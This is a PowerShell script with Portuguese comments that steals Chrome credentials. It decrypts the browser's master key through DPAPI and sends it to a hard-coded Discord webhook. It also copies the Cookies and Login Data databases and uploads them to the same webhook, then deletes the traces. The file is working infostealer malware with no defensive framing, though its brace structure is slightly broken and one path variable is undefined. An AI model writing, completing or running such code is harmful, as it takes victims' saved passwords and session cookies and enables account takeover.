$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKey = $json.os_crypt.encrypted_key

    # Converte de Base64
    $allBytes = [Convert]::FromBase64String($encryptedKey)
    
    # O Chrome coloca 'DPAPI' (5 bytes) no início. Precisamos remover isso.
    # Mas vamos garantir que estamos pegando apenas o que importa:
    $trimmedKey = $allBytes[5..($allBytes.Length - 1)]

    Add-Type -AssemblyName System.Security
    
    # Tentativa de Unprotect com tratamento de escopo explícito
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    $finalKey = [Convert]::ToBase64String($decryptedKey)
    curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u

} catch {
    # Se der erro de parâmetro, vamos tentar uma alternativa de limpeza de bytes
    try {
        $trimmedKey = $allBytes | Select-Object -Skip 5
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, 'CurrentUser')
        $finalKey = [Convert]::ToBase64String($decryptedKey)
        curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA_ALT: $finalKey" $u
    } catch {
        curl.exe -F "content=❌ Erro persistente na chave: $($_.Exception.Message)" $u
    }
}

    # 4. Envia os arquivos (Cookies e Senhas)
    $paths = @(
        (Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1),
        (Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1)
    )

    foreach ($file in $paths) {
        if ($file) {
            $temp = "$env:TEMP\" + $file.Name + ".db"
            Copy-Item $file.FullName $temp -Force
            curl.exe -F "file=@$temp" $u
            Remove-Item $temp -Force
        }
    }
} catch {
    curl.exe -F "content=❌ Erro Geral no Script" $u
}
exit
